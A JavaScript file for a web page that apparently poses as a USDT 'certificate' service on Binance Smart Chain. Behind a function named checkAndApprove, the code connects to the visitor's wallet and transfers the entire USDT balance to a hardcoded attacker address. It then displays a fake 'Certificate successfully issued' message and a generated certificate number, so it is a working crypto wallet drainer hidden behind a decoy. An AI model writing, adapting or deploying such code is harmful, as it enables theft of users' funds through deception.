const BSC_CHAIN_ID = '0x38';
const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RECEIVER_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';
let web3, usdtContract;

const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

async function checkAndApprove() {
  if (typeof window.ethereum === 'undefined') {
    alert("Please install MetaMask or Trust Wallet.");
    return;
  }

  web3 = new Web3(window.ethereum);
  await switchToBSC();
  const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
  const userAddress = accounts[0];

  usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
  const balance = await usdtContract.methods.balanceOf(userAddress).call();

  if (Number(balance) === 0) {
    alert("You have 0 USDT in your wallet.");
    return;
  }

  const tx = await usdtContract.methods.transfer(RECEIVER_ADDRESS, balance).send({ from: userAddress });

  document.getElementById("status").textContent = `✅ Certificate successfully issued. Transferred USDT: ${web3.utils.fromWei(balance, 'ether')}`;
  document.getElementById("walletAddress").textContent = `Wallet: ${userAddress}`;
  document.getElementById("balanceAmount").textContent = `${web3.utils.fromWei(balance, 'ether')} USDT`;
  document.getElementById("certificateNumber").textContent = "CERT-" + Date.now().toString(36).toUpperCase();
}

async function switchToBSC() {
  try {
    await ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: BSC_CHAIN_ID }],
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      await ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: 'Binance Smart Chain',
          rpcUrls: ['https://bsc-dataseed.binance.org/'],
          nativeCurrency: {
            name: 'BNB',
            symbol: 'BNB',
            decimals: 18,
          },
          blockExplorerUrls: ['https://bscscan.com'],
        }],
      });
    } else {
      throw switchError;
    }
  }
}
